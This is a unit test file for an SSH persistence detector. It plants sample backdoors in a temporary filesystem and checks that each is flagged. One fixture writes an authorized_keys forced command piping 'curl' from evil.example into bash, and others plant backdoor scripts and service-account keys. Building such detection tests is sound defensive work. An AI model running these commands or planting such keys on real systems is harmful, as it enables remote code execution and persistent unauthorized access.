import os
import stat
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory
from unittest.mock import patch

from persisthunt.detectors.ssh import SSHDetector
from persisthunt.findings import FindingCollection, Finding, Severity

# Dummy valid base64 key strings for testing (public key format)
DUMMY_ED25519_KEY = "AAAAC3NzaC1lZDI1NTE5AAAAIOMq1f9z57U7bFk9s01o8fG/examplePublicBlob12345"
DUMMY_RSA_KEY = "AAAAB3NzaC1yc2EAAAADAQABAAABAQC7dummyRsaPublicBlobData67890"

class TestSSHDetector(unittest.TestCase):
    def setUp(self):
        self.temp_dir = TemporaryDirectory()
        self.root = Path(self.temp_dir.name)

        # Directory layout
        self.root_ssh = self.root / "root" / ".ssh"
        self.root_ssh.mkdir(parents=True)
        self.root_ssh.chmod(0o700)

        self.home = self.root / "home"
        self.home.mkdir(parents=True)

        self.user_dir = self.home / "alice"
        self.user_ssh = self.user_dir / ".ssh"
        self.user_ssh.mkdir(parents=True)
        self.user_ssh.chmod(0o700)

        self.etc_ssh = self.root / "etc" / "ssh"
        self.etc_ssh.mkdir(parents=True)
        self.sshd_config = self.etc_ssh / "sshd_config"
        self.sshd_config.write_text("# Default safe sshd config\nPermitEmptyPasswords no\n")

        self.svc_dir = self.root / "var" / "www"
        self.svc_dir.mkdir(parents=True)

    def tearDown(self):
        self.temp_dir.cleanup()

    def _get_detector(self):
        return SSHDetector(
            root_prefix=self.root,
            root_ssh_dir=self.root_ssh,
            home_dir=self.home,
            sshd_config_path=self.sshd_config,
            sshd_config_d=self.etc_ssh / "sshd_config.d",
            service_account_dirs=[self.svc_dir],
        )

    def test_empty_system_returns_empty_collection(self):
        detector = self._get_detector()
        findings = detector.scan()
        self.assertIsInstance(findings, FindingCollection)
        self.assertEqual(findings.count(), 0)

    def test_missing_directories_do_not_crash(self):
        detector = SSHDetector(
            root_ssh_dir=self.root / "nonexistent_root_ssh",
            home_dir=self.root / "nonexistent_home",
            sshd_config_path=self.root / "nonexistent_sshd_config",
            sshd_config_d=self.root / "nonexistent_sshd_d",
        )
        findings = detector.scan()
        self.assertIsInstance(findings, FindingCollection)
        self.assertEqual(findings.count(), 0)

    def test_valid_standard_user_authorized_key(self):
        auth_keys = self.user_ssh / "authorized_keys"
        auth_keys.write_text(f"ssh-ed25519 {DUMMY_ED25519_KEY} alice@workstation\n")
        auth_keys.chmod(0o600)

        detector = self._get_detector()
        findings = detector.scan()

        # Legitimate user key with strict permissions should produce 0 findings
        self.assertEqual(findings.count(), 0)

    def test_multiple_valid_authorized_keys(self):
        auth_keys = self.user_ssh / "authorized_keys"
        auth_keys.write_text(
            f"ssh-ed25519 {DUMMY_ED25519_KEY} key1\n"
            f"ssh-rsa {DUMMY_RSA_KEY} key2\n"
        )
        auth_keys.chmod(0o600)

        detector = self._get_detector()
        findings = detector.scan()
        self.assertEqual(findings.count(), 0)

    def test_root_authorized_keys_observation(self):
        root_keys = self.root_ssh / "authorized_keys"
        root_keys.write_text(f"ssh-ed25519 {DUMMY_ED25519_KEY} admin@management\n")
        root_keys.chmod(0o600)

        detector = self._get_detector()
        findings = detector.scan()

        root_findings = [f for f in findings if f.id == "PH-SSH-001"]
        self.assertEqual(len(root_findings), 1)
        self.assertEqual(root_findings[0].severity, Severity.LOW)
        self.assertIn("Root SSH authorized keys", root_findings[0].title)

    def test_suspicious_forced_command_with_indicators(self):
        auth_keys = self.user_ssh / "authorized_keys"
        auth_keys.write_text(
            f'command="/tmp/backdoor.sh",no-pty ssh-ed25519 {DUMMY_ED25519_KEY} attacker\n'
        )
        auth_keys.chmod(0o600)

        detector = self._get_detector()
        findings = detector.scan()

        cmd_findings = [f for f in findings if f.id == "PH-SSH-002"]
        self.assertEqual(len(cmd_findings), 1)
        self.assertEqual(cmd_findings[0].severity, Severity.HIGH)
        self.assertIn("Suspicious forced command", cmd_findings[0].title)
        self.assertIn("SHA256:", cmd_findings[0].evidence)
        self.assertNotIn(DUMMY_ED25519_KEY, cmd_findings[0].evidence)  # Fingerprinted, not raw key

    def test_suspicious_download_pipe_forced_command(self):
        auth_keys = self.user_ssh / "authorized_keys"
        auth_keys.write_text(
            f'command="curl -s https://evil.example/a | bash" ssh-rsa {DUMMY_RSA_KEY} evil\n'
        )
        auth_keys.chmod(0o600)

        detector = self._get_detector()
        findings = detector.scan()

        cmd_findings = [f for f in findings if f.id == "PH-SSH-002"]
        self.assertEqual(len(cmd_findings), 1)
        self.assertEqual(cmd_findings[0].severity, Severity.HIGH)

    def test_generic_forced_command(self):
        # A normal forced command like git-shell
        auth_keys = self.user_ssh / "authorized_keys"
        auth_keys.write_text(
            f'command="/usr/bin/git-shell -c \\"$SSH_ORIGINAL_COMMAND\\"" ssh-rsa {DUMMY_RSA_KEY} git-user\n'
        )
        auth_keys.chmod(0o600)

        detector = self._get_detector()
        findings = detector.scan()

        cmd_findings = [f for f in findings if f.id == "PH-SSH-002"]
        self.assertEqual(len(cmd_findings), 1)
        self.assertEqual(cmd_findings[0].severity, Severity.MEDIUM)

    def test_insecure_world_writable_permissions(self):
        # Insecure .ssh directory permissions (0o777)
        self.user_ssh.chmod(0o777)
        auth_keys = self.user_ssh / "authorized_keys"
        auth_keys.write_text(f"ssh-ed25519 {DUMMY_ED25519_KEY} test\n")
        auth_keys.chmod(0o666)  # World-writable file

        detector = self._get_detector()
        findings = detector.scan()

        perm_findings = [f for f in findings if f.id == "PH-SSH-004"]
        self.assertGreaterEqual(len(perm_findings), 2)
        for f in perm_findings:
            self.assertEqual(f.severity, Severity.HIGH)

    def test_service_account_with_authorized_keys(self):
        svc_ssh = self.svc_dir / ".ssh"
        svc_ssh.mkdir()
        svc_ssh.chmod(0o700)
        auth_keys = svc_ssh / "authorized_keys"
        auth_keys.write_text(f"ssh-ed25519 {DUMMY_ED25519_KEY} web-backdoor\n")
        auth_keys.chmod(0o600)

        detector = self._get_detector()
        findings = detector.scan()

        svc_findings = [f for f in findings if f.id == "PH-SSH-003"]
        self.assertEqual(len(svc_findings), 1)
        self.assertEqual(svc_findings[0].severity, Severity.HIGH)
        self.assertIn("service account", svc_findings[0].title.lower())

    def test_private_key_material_shielding_and_detection(self):
        # Private key mistakenly pasted into authorized_keys
        auth_keys = self.user_ssh / "authorized_keys"
        fake_private_key = (
            "-----BEGIN OPENSSH PRIVATE KEY-----\n"
            "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\n"
            "-----END OPENSSH PRIVATE KEY-----\n"
        )
        auth_keys.write_text(fake_private_key)
        auth_keys.chmod(0o600)

        detector = self._get_detector()
        findings = detector.scan()

        priv_findings = [f for f in findings if f.id == "PH-SSH-005"]
        self.assertEqual(len(priv_findings), 1)
        self.assertEqual(priv_findings[0].severity, Severity.HIGH)
        # Verify private key is NEVER exposed in evidence
        self.assertEqual(priv_findings[0].evidence, "[REDACTED PRIVATE KEY MATERIAL]")
        self.assertNotIn("b3BlbnNzaC", priv_findings[0].evidence)

    def test_insecure_sshd_config_options(self):
        config_content = (
            "PermitEmptyPasswords yes\n"
            "PermitRootLogin yes\n"
            "AuthorizedKeysFile /tmp/keys/%u\n"
            "AuthorizedKeysCommand /usr/local/bin/keys.sh\n"
        )
        self.sshd_config.write_text(config_content)

        detector = self._get_detector()
        findings = detector.scan()

        cfg_findings = [f for f in findings if f.id == "PH-SSH-006"]
        self.assertEqual(len(cfg_findings), 4)

        severities = {f.title: f.severity for f in cfg_findings}
        self.assertEqual(severities["SSH daemon permits empty passwords"], Severity.HIGH)
        self.assertEqual(severities["AuthorizedKeysFile points to temporary directory"], Severity.HIGH)
        self.assertEqual(severities["Unrestricted root login enabled in SSH daemon"], Severity.MEDIUM)
        self.assertEqual(severities["External AuthorizedKeysCommand configured in SSH daemon"], Severity.MEDIUM)

    def test_malformed_authorized_keys_entry(self):
        auth_keys = self.user_ssh / "authorized_keys"
        auth_keys.write_text("not a valid ssh key line at all\n")
        auth_keys.chmod(0o600)

        detector = self._get_detector()
        findings = detector.scan()

        malformed_findings = [f for f in findings if f.id == "PH-SSH-092"]
        self.assertEqual(len(malformed_findings), 1)
        self.assertEqual(malformed_findings[0].severity, Severity.LOW)

    def test_broken_symlink_in_ssh_directory(self):
        broken_link = self.user_ssh / "broken_link"
        broken_link.symlink_to("/nonexistent/target")

        detector = self._get_detector()
        findings = detector.scan()

        symlink_findings = [f for f in findings if f.id == "PH-SSH-091"]
        self.assertEqual(len(symlink_findings), 1)
        self.assertEqual(symlink_findings[0].severity, Severity.LOW)

    def test_permission_denied_handling(self):
        with patch("builtins.open", side_effect=PermissionError("Permission denied")):
            auth_keys = self.user_ssh / "authorized_keys"
            auth_keys.write_text(f"ssh-ed25519 {DUMMY_ED25519_KEY} user\n")
            detector = self._get_detector()
            findings = detector.scan()

            perm_findings = [f for f in findings if f.id == "PH-SSH-090"]
            self.assertGreaterEqual(len(perm_findings), 1)
            self.assertEqual(perm_findings[0].severity, Severity.INFO)

    def test_read_only_safety_preserves_files(self):
        auth_keys = self.user_ssh / "authorized_keys"
        original = f"ssh-ed25519 {DUMMY_ED25519_KEY} user\n"
        auth_keys.write_text(original)
        auth_keys.chmod(0o600)
        mtime_before = auth_keys.stat().st_mtime_ns

        detector = self._get_detector()
        findings = detector.scan()

        self.assertEqual(auth_keys.read_text(), original)
        self.assertEqual(auth_keys.stat().st_mtime_ns, mtime_before)

    def test_real_system_scan_does_not_crash(self):
        detector = SSHDetector()
        findings = detector.scan()
        self.assertIsInstance(findings, FindingCollection)
        for f in findings:
            self.assertIsInstance(f, Finding)
            self.assertEqual(f.category, "ssh")
            self.assertTrue(f.id.startswith("PH-SSH-"))
            self.assertIsInstance(f.severity, Severity)

if __name__ == "__main__":
    unittest.main()
